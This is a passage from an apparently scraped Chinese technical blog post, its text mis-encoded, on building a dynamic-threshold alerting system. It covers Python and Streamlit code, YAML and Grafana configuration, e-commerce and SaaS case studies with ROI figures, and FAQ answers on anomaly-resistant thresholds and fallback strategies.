                <span class="hljs-string">'confidence'</span>: result[<span class="hljs-string">'confidence'</span>]
            }
        }
        self.timeseries_db.write_points([point])
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_alert_id</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""ç”Ÿæˆå”¯ä¸€å‘Šè­¦ID"""</span>
        <span class="hljs-keyword">import</span> uuid
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(uuid.uuid4())
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_trigger_auto_remediation</span>(<span class="hljs-params">self, alert</span>):
        <span class="hljs-string">"""è§¦å‘è‡ªåŠ¨ä¿®å¤"""</span>
        <span class="hljs-comment"># ç¤ºä¾‹ï¼šCPUè¿‡é«˜æ—¶è‡ªåŠ¨æ‰©å®¹</span>
        <span class="hljs-keyword">if</span> alert[<span class="hljs-string">'metric'</span>] == <span class="hljs-string">'cpu_usage'</span> <span class="hljs-keyword">and</span> alert[<span class="hljs-string">'severity'</span>] == <span class="hljs-string">'critical'</span>:
            logging.info(<span class="hljs-string">"è§¦å‘è‡ªåŠ¨æ‰©å®¹..."</span>)
            <span class="hljs-comment"># è°ƒç”¨äº‘å¹³å°APIè¿›è¡Œæ‰©å®¹</span>
            <span class="hljs-comment"># cloud_api.scale_up(instance_id)</span>
</code></pre>
<p>5.2 é…ç½®æ–‡ä»¶ç¤ºä¾‹</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># config.yaml</span>
<span class="hljs-attr">metrics:</span>
  <span class="hljs-attr">default:</span>
    <span class="hljs-attr">window_size:</span> <span class="hljs-number">168</span>
    <span class="hljs-attr">seasonal_period:</span> <span class="hljs-number">24</span>
    <span class="hljs-attr">sigma_multiplier:</span> <span class="hljs-number">3</span>
    <span class="hljs-attr">min_samples:</span> <span class="hljs-number">48</span>
  
  <span class="hljs-attr">high_frequency:</span>
    <span class="hljs-attr">window_size:</span> <span class="hljs-number">24</span>
    <span class="hljs-attr">seasonal_period:</span> <span class="hljs-number">1</span>
    <span class="hljs-attr">sigma_multiplier:</span> <span class="hljs-number">2.5</span>
    <span class="hljs-attr">min_samples:</span> <span class="hljs-number">12</span>
  
  <span class="hljs-attr">batch_job:</span>
    <span class="hljs-attr">window_size:</span> <span class="hljs-number">720</span>
    <span class="hljs-attr">seasonal_period:</span> <span class="hljs-number">168</span>
    <span class="hljs-attr">sigma_multiplier:</span> <span class="hljs-number">4</span>
    <span class="hljs-attr">min_samples:</span> <span class="hljs-number">168</span>

<span class="hljs-attr">alert_suppression:</span>
  <span class="hljs-attr">cooldown_period:</span> <span class="hljs-number">300</span>  <span class="hljs-comment"># 5åˆ†é’Ÿ</span>
  <span class="hljs-attr">aggregation_window:</span> <span class="hljs-number">60</span>  <span class="hljs-comment"># 1åˆ†é’Ÿ</span>

<span class="hljs-attr">notifications:</span>
  <span class="hljs-attr">dingtalk_webhook:</span> <span class="hljs-string">"https://oapi.dingtalk.com/robot/send?access_token=xxx"</span>
  <span class="hljs-attr">smtp:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-string">"smtp.company.com"</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">587</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">"alert@company.com"</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">"xxx"</span>
  <span class="hljs-attr">pagerduty_key:</span> <span class="hljs-string">"xxx"</span>

<span class="hljs-attr">auto_remediation_enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">influxdb:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8086</span>
  <span class="hljs-attr">database:</span> <span class="hljs-string">"monitoring"</span>

<span class="hljs-attr">postgres:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">5432</span>
  <span class="hljs-attr">database:</span> <span class="hljs-string">"alerts"</span>
  <span class="hljs-attr">username:</span> <span class="hljs-string">"admin"</span>
  <span class="hljs-attr">password:</span> <span class="hljs-string">"xxx"</span>
</code></pre>
<h3 data-id="heading-23">5.3 ç›‘æ§ä¸å¯è§†åŒ–</h3>
<h3 data-id="heading-24">5.3.1 Grafana Dashboardé…ç½®</h3>
<pre><code class="hljs language-lua" lang="lua">{
  <span class="hljs-string">"dashboard"</span>: {
    <span class="hljs-string">"title"</span>: <span class="hljs-string">"åŠ¨æ€é˜ˆå€¼ç›‘æ§"</span>,
    <span class="hljs-string">"panels"</span>: [
      {
        <span class="hljs-string">"title"</span>: <span class="hljs-string">"CPUä½¿ç”¨ç‡ - åŠ¨æ€é˜ˆå€¼"</span>,
        <span class="hljs-string">"targets"</span>: [
          {
            <span class="hljs-string">"measurement"</span>: <span class="hljs-string">"dynamic_thresholds"</span>,
            <span class="hljs-string">"select"</span>: [
              [<span class="hljs-string">"current_value"</span>, <span class="hljs-string">"å®é™…å€¼"</span>],
              [<span class="hljs-string">"expected_value"</span>, <span class="hljs-string">"é¢„æœŸå€¼"</span>],
              [<span class="hljs-string">"upper_bound"</span>, <span class="hljs-string">"ä¸Šç•Œ"</span>],
              [<span class="hljs-string">"lower_bound"</span>, <span class="hljs-string">"ä¸‹ç•Œ"</span>]
            ],
            <span class="hljs-string">"where"</span>: [
              {<span class="hljs-string">"key"</span>: <span class="hljs-string">"metric"</span>, <span class="hljs-string">"value"</span>: <span class="hljs-string">"cpu_usage"</span>}
            ]
          }
        ],
        <span class="hljs-string">"visualization"</span>: <span class="hljs-string">"timeseries"</span>,
        <span class="hljs-string">"fieldConfig"</span>: {
          <span class="hljs-string">"overrides"</span>: [
            {
              <span class="hljs-string">"matcher"</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-string">"byName"</span>, <span class="hljs-string">"options"</span>: <span class="hljs-string">"ä¸Šç•Œ"</span>},
              <span class="hljs-string">"properties"</span>: [
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"color"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"mode"</span>: <span class="hljs-string">"fixed"</span>, <span class="hljs-string">"fixedColor"</span>: <span class="hljs-string">"red"</span>}},
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"custom.lineStyle"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"dash"</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">10</span>]}}
              ]
            },
            {
              <span class="hljs-string">"matcher"</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-string">"byName"</span>, <span class="hljs-string">"options"</span>: <span class="hljs-string">"ä¸‹ç•Œ"</span>},
              <span class="hljs-string">"properties"</span>: [
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"color"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"mode"</span>: <span class="hljs-string">"fixed"</span>, <span class="hljs-string">"fixedColor"</span>: <span class="hljs-string">"red"</span>}},
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"custom.lineStyle"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"dash"</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">10</span>]}}
              ]
            }
          ]
        }
      },
      {
        <span class="hljs-string">"title"</span>: <span class="hljs-string">"å‘Šè­¦ç»Ÿè®¡"</span>,
        <span class="hljs-string">"targets"</span>: [
          {
            <span class="hljs-string">"query"</span>: <span class="hljs-string">"SELECT COUNT(*) FROM alerts WHERE time &gt; now() - 24h GROUP BY severity"</span>
          }
        ],
        <span class="hljs-string">"visualization"</span>: <span class="hljs-string">"piechart"</span>
      },
      {
        <span class="hljs-string">"title"</span>: <span class="hljs-string">"ç½®ä¿¡åº¦åˆ†å¸ƒ"</span>,
        <span class="hljs-string">"targets"</span>: [
          {
            <span class="hljs-string">"measurement"</span>: <span class="hljs-string">"dynamic_thresholds"</span>,
            <span class="hljs-string">"select"</span>: <span class="hljs-string">[["confidence", "ç½®ä¿¡åº¦"]]</span>
          }
        ],
        <span class="hljs-string">"visualization"</span>: <span class="hljs-string">"histogram"</span>
      }
    ]
  }
}
</code></pre>
<p>5.3.2 å®æ—¶ç›‘æ§è„šæœ¬</p>
<pre><code class="hljs language-ini" lang="ini">import streamlit as st
import pandas as pd
import plotly.graph_objects as go
from datetime import datetime, timedelta

class RealtimeMonitoringDashboard:
    """å®æ—¶ç›‘æ§ä»ªè¡¨æ¿"""
    
    def __init__(self, alerting_system):
        <span class="hljs-attr">self.system</span> = alerting_system
    
    def run(self):
        st.title("åŠ¨æ€é˜ˆå€¼å®æ—¶ç›‘æ§")
        
        <span class="hljs-comment"># ä¾§è¾¹æ ï¼šé€‰æ‹©æŒ‡æ ‡</span>
        <span class="hljs-attr">metric_name</span> = st.sidebar.selectbox(
            "é€‰æ‹©ç›‘æ§æŒ‡æ ‡",
            list(self.system.threshold_generators.keys())
        )
        
        <span class="hljs-comment"># ä¸»é¢æ¿ï¼šæ—¶åºå›¾</span>
        self._render_timeseries_chart(metric_name)
        
        <span class="hljs-comment"># ç»Ÿè®¡ä¿¡æ¯</span>
        col1, col2, <span class="hljs-attr">col3</span> = st.columns(<span class="hljs-number">3</span>)
        with col1:
            st.metric("24å°æ—¶å‘Šè­¦æ•°", self._get_alert_count(24))
        with col2:
            st.metric("å‘Šè­¦å‡†ç¡®ç‡", f"{self._get_precision():.1%}")
        with col3:
            st.metric("å¹³å‡ç½®ä¿¡åº¦", f"{self._get_avg_confidence():.2f}")
        
        <span class="hljs-comment"># æœ€è¿‘å‘Šè­¦åˆ—è¡¨</span>
        st.subheader("æœ€è¿‘å‘Šè­¦")
        self._render_recent_alerts()
    
    def _render_timeseries_chart(self, metric_name):
        """æ¸²æŸ“æ—¶åºå›¾"""
        <span class="hljs-comment"># ä»æ•°æ®åº“è·å–æœ€è¿‘24å°æ—¶æ•°æ®</span>
        <span class="hljs-attr">data</span> = self._fetch_data(metric_name, hours=<span class="hljs-number">24</span>)
        
        <span class="hljs-attr">fig</span> = go.Figure()
        
        <span class="hljs-comment"># å®é™…å€¼</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'current_value'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'å®é™…å€¼'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'blue'</span>, width=<span class="hljs-number">2</span>)
        ))
        
        <span class="hljs-comment"># é¢„æœŸå€¼</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'expected_value'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'é¢„æœŸå€¼'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'green'</span>, width=<span class="hljs-number">1</span>, dash=<span class="hljs-string">'dash'</span>)
        ))
        
        <span class="hljs-comment"># ä¸Šç•Œ</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'upper_bound'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'ä¸Šç•Œ'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'red'</span>, width=<span class="hljs-number">1</span>, dash=<span class="hljs-string">'dot'</span>)
        ))
        
        <span class="hljs-comment"># ä¸‹ç•Œ</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'lower_bound'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'ä¸‹ç•Œ'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'red'</span>, width=<span class="hljs-number">1</span>, dash=<span class="hljs-string">'dot'</span>),
            <span class="hljs-attr">fill</span>=<span class="hljs-string">'tonexty'</span>,
            <span class="hljs-attr">fillcolor</span>=<span class="hljs-string">'rgba(255,0,0,0.1)'</span>
        ))
        
        <span class="hljs-comment"># æ ‡è®°å‘Šè­¦ç‚¹</span>
        <span class="hljs-attr">alerts</span> = data[data[<span class="hljs-string">'is_alert'</span>] == <span class="hljs-literal">True</span>]
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=alerts[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=alerts[<span class="hljs-string">'current_value'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'markers'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'å‘Šè­¦'</span>,
            <span class="hljs-attr">marker</span>=dict(color=<span class="hljs-string">'red'</span>, size=<span class="hljs-number">10</span>, symbol=<span class="hljs-string">'x'</span>)
        ))
        
        fig.update_layout(
            <span class="hljs-attr">title</span>=f<span class="hljs-string">"{metric_name} - åŠ¨æ€é˜ˆå€¼ç›‘æ§"</span>,
            <span class="hljs-attr">xaxis_title</span>=<span class="hljs-string">"æ—¶é—´"</span>,
            <span class="hljs-attr">yaxis_title</span>=<span class="hljs-string">"å€¼"</span>,
            <span class="hljs-attr">hovermode</span>=<span class="hljs-string">'x unified'</span>
        )
        
        st.plotly_chart(fig, <span class="hljs-attr">use_container_width</span>=<span class="hljs-literal">True</span>)
    
    def _render_recent_alerts(self):
        """æ¸²æŸ“æœ€è¿‘å‘Šè­¦åˆ—è¡¨"""
        <span class="hljs-attr">alerts</span> = self._fetch_recent_alerts(limit=<span class="hljs-number">10</span>)
        
        <span class="hljs-attr">df</span> = pd.DataFrame(alerts)
        df<span class="hljs-section">['timestamp']</span> = pd.to_datetime(df<span class="hljs-section">['timestamp']</span>)
        
        st.dataframe(
            df<span class="hljs-section">[['timestamp', 'metric', 'severity', 'deviation', 'confidence']]</span>,
            <span class="hljs-attr">use_container_width</span>=<span class="hljs-literal">True</span>
        )
</code></pre>
<h2 data-id="heading-25">å…­ã€çœŸå®æ¡ˆä¾‹ä¸æ•ˆæœè¯„ä¼°</h2>
<h3 data-id="heading-26">6.1 æ¡ˆä¾‹ä¸€ï¼šæŸç”µå•†å¹³å°</h3>
<p>èƒŒæ™¯ï¼š</p>
<ul>
<li>æ—¥å‡PV 5000ä¸‡</li>
<li>å¾®æœåŠ¡æ¶æ„ï¼Œ200+æœåŠ¡å®ä¾‹</li>
<li>åŸæœ‰å›ºå®šé˜ˆå€¼å‘Šè­¦ç³»ç»Ÿæ¯å¤©äº§ç”Ÿ800+å‘Šè­¦</li>
</ul>
<p>å®æ–½æ–¹æ¡ˆï¼š</p>
<ol>
<li>ä¸ºæ ¸å¿ƒæœåŠ¡ï¼ˆè®¢å•ã€æ”¯ä»˜ã€åº“å­˜ï¼‰éƒ¨ç½²åŠ¨æ€é˜ˆå€¼</li>
<li>é…ç½®7å¤©æ»‘åŠ¨çª—å£ï¼Œ24å°æ—¶å­£èŠ‚å‘¨æœŸ</li>
<li>æ³¨å†ŒåŒ11ã€618ç­‰å¤§ä¿ƒäº‹ä»¶</li>
</ol>
<p>æ•ˆæœå¯¹æ¯”ï¼š</p>









































<table><thead><tr><th>æŒ‡æ ‡</th><th>å®æ–½å‰</th><th>å®æ–½å</th><th>æ”¹å–„å¹…åº¦</th></tr></thead><tbody><tr><td>æ—¥å‡å‘Šè­¦æ•°</td><td>823</td><td>287</td><td>-65%</td></tr><tr><td>æœ‰æ•ˆå‘Šè­¦æ¯”ä¾‹</td><td>22%</td><td>68%</td><td>+209%</td></tr><tr><td>å¹³å‡å“åº”æ—¶é—´</td><td>18åˆ†é’Ÿ</td><td>6åˆ†é’Ÿ</td><td>-67%</td></tr><tr><td>è¯¯æŠ¥ç‡</td><td>78%</td><td>32%</td><td>-59%</td></tr><tr><td>æ•…éšœå‘ç°æ—¶é—´</td><td>å¹³å‡15åˆ†é’Ÿ</td><td>å¹³å‡3åˆ†é’Ÿ</td><td>-80%</td></tr></tbody></table>
<p>å…³é”®æ”¶ç›Šï¼š</p>
<ul>
<li>è¿ç»´äººå‘˜ä»"æ•‘ç«"è½¬å‘"ä¼˜åŒ–"</li>
<li>åŒ11æœŸé—´é›¶è¯¯æŠ¥ï¼Œæ‰€æœ‰å‘Šè­¦å‡ä¸ºçœŸå®é—®é¢˜</li>
<li>æå‰å‘ç°äº†3æ¬¡æ½œåœ¨çš„ç³»ç»Ÿç“¶é¢ˆ</li>
</ul>
<h3 data-id="heading-27">6.2 æ¡ˆä¾‹äºŒï¼šæŸSaaSå…¬å¸</h3>
<p>èƒŒæ™¯ï¼š</p>
<ul>
<li>B2B SaaSäº§å“ï¼Œå®¢æˆ·éå¸ƒå…¨çƒ</li>
<li>ä¸šåŠ¡å¢é•¿è¿…é€Ÿï¼ˆæœˆå¢é•¿30%ï¼‰</li>
<li>å›ºå®šé˜ˆå€¼æ— æ³•é€‚åº”å¿«é€Ÿå¢é•¿</li>
</ul>
<p>å®æ–½æ–¹æ¡ˆï¼š</p>
<ol>
<li>å¯ç”¨è‡ªé€‚åº”å­¦ä¹ ç³»ç»Ÿ</li>
<li>é›†æˆè¿ç»´äººå‘˜åé¦ˆæœºåˆ¶</li>
<li>æŒ‰å®¢æˆ·æ—¶åŒºé…ç½®ä¸åŒçš„å­£èŠ‚å‘¨æœŸ</li>
</ol>
<p>æ•ˆæœï¼š</p>
<ul>
<li>3ä¸ªæœˆå†…ï¼Œç³»ç»Ÿè‡ªåŠ¨å°†sigmaå€æ•°ä»3.0è°ƒæ•´åˆ°3.8</li>
<li>å‘Šè­¦å‡†ç¡®ç‡ä»45%æå‡åˆ°82%</li>
<li>æˆåŠŸé€‚åº”äº†ä¸šåŠ¡ä»10ä¸‡ç”¨æˆ·åˆ°50ä¸‡ç”¨æˆ·çš„å¢é•¿</li>
</ul>
<h3 data-id="heading-28">6.3 æŠ•èµ„å›æŠ¥ç‡ï¼ˆROIï¼‰åˆ†æ</h3>
<p>æˆæœ¬ï¼š</p>
<ul>
<li>å¼€å‘æˆæœ¬ï¼š2äººæœˆ</li>
<li>åŸºç¡€è®¾æ–½æˆæœ¬ï¼šæ—¶åºæ•°æ®åº“å­˜å‚¨ $200/æœˆ</li>
<li>ç»´æŠ¤æˆæœ¬ï¼š0.5äººæœˆ/å¹´</li>
</ul>
<p>æ”¶ç›Šï¼ˆå¹´åŒ–ï¼‰ï¼š</p>
<ul>
<li>å‡å°‘è¯¯æŠ¥èŠ‚çœçš„äººåŠ›ï¼š800å°æ—¶ Ã— <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>50</mn><mi mathvariant="normal">/</mi><mtext>å°æ—¶</mtext><mo>=</mo></mrow><annotation encoding="application/x-tex">50/å°æ—¶ = </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">50/</span><span class="mord cjk_fallback">å°æ—¶</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span></span></span></span></span>40,000</li>
<li>æå‰å‘ç°æ•…éšœé¿å…çš„æŸå¤±ï¼šä¼°ç®— $100,000</li>
<li>æå‡è¿ç»´æ•ˆç‡çš„ä»·å€¼ï¼š$50,000</li>
</ul>
<p>ROI = (æ”¶ç›Š - æˆæœ¬) / æˆæœ¬ Ã— 100%</p>
<p>ROI = (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>190</mn><mo separator="true">,</mo><mn>000</mn><mo>âˆ’</mo></mrow><annotation encoding="application/x-tex">190,000 - </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"/><span class="mord">190</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">000</span><span class="mord">âˆ’</span></span></span></span></span>12,400) / $12,400 Ã— 100% = 1,432%</p>
<h2 data-id="heading-29">ä¸ƒã€å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-30">Q1: åŠ¨æ€é˜ˆå€¼ä¼šä¸ä¼š"ä¹ æƒ¯"å¼‚å¸¸çŠ¶æ€ï¼Ÿ</h3>
<p>é—®é¢˜æè¿°ï¼šå¦‚æœç³»ç»Ÿé•¿æœŸå¤„äºå¼‚å¸¸çŠ¶æ€ï¼ˆå¦‚å†…å­˜æ³„æ¼å¯¼è‡´å†…å­˜æŒç»­ä¸Šå‡ï¼‰ï¼ŒåŠ¨æ€é˜ˆå€¼ä¼šä¸ä¼šé€æ¸é€‚åº”è¿™ç§å¼‚å¸¸ï¼Œå¯¼è‡´æ— æ³•å‘Šè­¦ï¼Ÿ</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnomalyResistantThresholdGenerator</span>(<span class="hljs-title class_ inherited__">DynamicThresholdGenerator</span>):
    <span class="hljs-string">"""æŠ—å¼‚å¸¸æ±¡æŸ“çš„é˜ˆå€¼ç”Ÿæˆå™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_preprocess_series</span>(<span class="hljs-params">self, values</span>):
        <span class="hljs-string">"""å¢å¼ºçš„é¢„å¤„ç†ï¼šæ£€æµ‹å¹¶ç§»é™¤æŒç»­å¼‚å¸¸"""</span>
        <span class="hljs-comment"># 1. åŸºç¡€é¢„å¤„ç†</span>
        values = <span class="hljs-built_in">super</span>()._preprocess_series(values)
        
        <span class="hljs-comment"># 2. æ£€æµ‹æŒç»­ä¸Šå‡è¶‹åŠ¿ï¼ˆå¯èƒ½æ˜¯å†…å­˜æ³„æ¼ï¼‰</span>
        <span class="hljs-keyword">if</span> self._detect_sustained_increase(values):
            <span class="hljs-comment"># ä½¿ç”¨æ›´æ—©æœŸçš„"å¥åº·"æ•°æ®</span>
            healthy_baseline = np.percentile(values[:<span class="hljs-built_in">len</span>(values)//<span class="hljs-number">2</span>], <span class="hljs-number">75</span>)
            <span class="hljs-comment"># å°†å¼‚å¸¸ä¸Šå‡éƒ¨åˆ†æ‹‰å›åˆ°å¥åº·åŸºçº¿</span>
            values = np.minimum(values, healthy_baseline * <span class="hljs-number">1.2</span>)
        
        <span class="hljs-keyword">return</span> values
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_detect_sustained_increase</span>(<span class="hljs-params">self, values, threshold=<span class="hljs-number">0.5</span></span>):
        <span class="hljs-string">"""æ£€æµ‹æŒç»­ä¸Šå‡ï¼ˆå¯èƒ½çš„å†…å­˜æ³„æ¼ç­‰ï¼‰"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(values) &lt; <span class="hljs-number">48</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        
        <span class="hljs-comment"># æ¯”è¾ƒå‰åä¸¤åŠçš„å‡å€¼</span>
        first_half_mean = np.mean(values[:<span class="hljs-built_in">len</span>(values)//<span class="hljs-number">2</span>])
        second_half_mean = np.mean(values[<span class="hljs-built_in">len</span>(values)//<span class="hljs-number">2</span>:])
        
        increase_rate = (second_half_mean - first_half_mean) / first_half_mean
        
        <span class="hljs-keyword">return</span> increase_rate &gt; threshold
</code></pre>
<h3 data-id="heading-31">Q2: å¦‚ä½•å¤„ç†çªå‘æµé‡ï¼ˆå¦‚çƒ­ç‚¹äº‹ä»¶ï¼‰ï¼Ÿ</h3>
<p>è§£å†³æ–¹æ¡ˆï¼šç»“åˆå®æ—¶æµé‡é¢„æµ‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficAwareDynamicThreshold</span>:
    <span class="hljs-string">"""æµé‡æ„ŸçŸ¥çš„åŠ¨æ€é˜ˆå€¼"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, threshold_gen, traffic_predictor</span>):
        self.threshold_gen = threshold_gen
        self.traffic_predictor = traffic_predictor
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">adjust_for_traffic</span>(<span class="hljs-params">self, base_thresholds, current_traffic</span>):
        <span class="hljs-string">"""æ ¹æ®å®æ—¶æµé‡è°ƒæ•´é˜ˆå€¼"""</span>
        <span class="hljs-comment"># é¢„æµ‹çš„æ­£å¸¸æµé‡</span>
        expected_traffic = self.traffic_predictor.predict()
        
        <span class="hljs-comment"># æµé‡å€æ•°</span>
        traffic_multiplier = current_traffic / expected_traffic
        
        <span class="hljs-keyword">if</span> traffic_multiplier &gt; <span class="hljs-number">2.0</span>:
            <span class="hljs-comment"># æµé‡æ¿€å¢ï¼Œæ”¾å®½é˜ˆå€¼</span>
            adjusted_thresholds = {
                <span class="hljs-string">'upper'</span>: base_thresholds[<span class="hljs-string">'upper'</span>] * traffic_multiplier * <span class="hljs-number">0.8</span>,
                <span class="hljs-string">'lower'</span>: base_thresholds[<span class="hljs-string">'lower'</span>],
                <span class="hljs-string">'note'</span>: <span class="hljs-string">f'æ£€æµ‹åˆ°<span class="hljs-subst">{traffic_multiplier:<span class="hljs-number">.1</span>f}</span>å€æµé‡ï¼Œé˜ˆå€¼å·²è°ƒæ•´'</span>
            }
            <span class="hljs-keyword">return</span> adjusted_thresholds
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> base_thresholds
</code></pre>
<h3 data-id="heading-32">Q3: æ•°æ®ä¸è¶³æ—¶å¦‚ä½•å¤„ç†ï¼Ÿ</h3>
<p>è§£å†³æ–¹æ¡ˆï¼šåˆ†å±‚é™çº§ç­–ç•¥</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_threshold_with_fallback</span>(<span class="hljs-params">metric_name, current_value, history_length</span>):
    <span class="hljs-string">"""åˆ†å±‚é™çº§çš„é˜ˆå€¼è·å–"""</span>
    <span class="hljs-keyword">if</span> history_length &gt;= <span class="hljs-number">168</span>:
        <span class="hljs-comment"># å±‚çº§1ï¼šå®Œæ•´çš„åŠ¨æ€é˜ˆå€¼ï¼ˆæœ€ä¼˜ï¼‰</span>
        <span class="hljs-keyword">return</span> dynamic_threshold_generator.get_thresholds()
    <span class="hljs-keyword">elif</span> history_length &gt;= <span class="hljs-number">48</span>:
        <span class="hljs-comment"># å±‚çº§2ï¼šç®€åŒ–çš„åŠ¨æ€é˜ˆå€¼ï¼ˆä½¿ç”¨ç§»åŠ¨å¹³å‡ï¼‰</span>
        <span class="hljs-keyword">return</span> simple_moving_average_threshold()
    <span class="hljs-keyword">elif</span> history_length &gt;= <span class="hljs-number">12</span>:
        <span class="hljs-comment"># å±‚çº§3ï¼šåŸºäºç™¾åˆ†ä½æ•°çš„é˜ˆå€¼</span>
        <span class="hljs-keyword">return</span> percentile_based_threshold(percentile=<span class="hljs-number">95</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># å±‚çº§4ï¼šä½¿ç”¨è¡Œä¸šé»˜è®¤å€¼</span>
        <span class="hljs-keyword">return</span> get_industry_default_threshold(metric_name)
</code></pre>
<h3 data-id="heading-33">Q4: å¦‚ä½•éªŒè¯åŠ¨æ€é˜ˆå€¼çš„æœ‰æ•ˆæ€§ï¼Ÿ</h3>
<p>è§£å†³æ–¹æ¡ˆï¼šA/Bæµ‹è¯•æ¡†æ¶</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ABTestingFramework</span>:
    <span class="hljs-string">"""A/Bæµ‹è¯•æ¡†æ¶"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.group_a_metrics = []  <span class="hljs-comment"># å›ºå®šé˜ˆå€¼ç»„</span>
        self.group_b_metrics = []  <span class="hljs-comment"># åŠ¨æ€é˜ˆå€¼ç»„</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_test</span>(<span class="hljs-params">self, duration_days=<span class="hljs-number">30</span></span>):
        <span class="hljs-string">"""è¿è¡ŒA/Bæµ‹è¯•"""</span>
        <span class="hljs-comment"># éšæœºåˆ†é…50%æµé‡åˆ°åŠ¨æ€é˜ˆå€¼</span>
        <span class="hljs-keyword">for</span> metric <span class="hljs-keyword">in</span> all_metrics:
            <span class="hljs-keyword">if</span> random.random() &lt; <span class="hljs-number">0.5</span>:
                use_dynamic_threshold(metric)
                self.group_b_metrics.append(metric)
            <span class="hljs-keyword">else</span>:
                use_fixed_threshold(metric)
                self.group_a_metrics.append(metric)
        
        <span class="hljs-comment"># æ”¶é›†duration_dayså¤©çš„æ•°æ®</span>
        time.sleep(duration_days * <span class="hljs-number">86400</span>)
        
        <span class="hljs-comment"># ç»Ÿè®¡åˆ†æ</span>
        <span class="hljs-keyword">return</span> self.analyze_results()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_results</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ†ææµ‹è¯•ç»“æœ"""</span>
        results = {
            <span class="hljs-string">'group_a'</span>: {
                <span class="hljs-string">'alert_count'</span>: self._count_alerts(self.group_a_metrics),
                <span class="hljs-string">'false_positive_rate'</span>: self._calc_fpr(self.group_a_metrics),
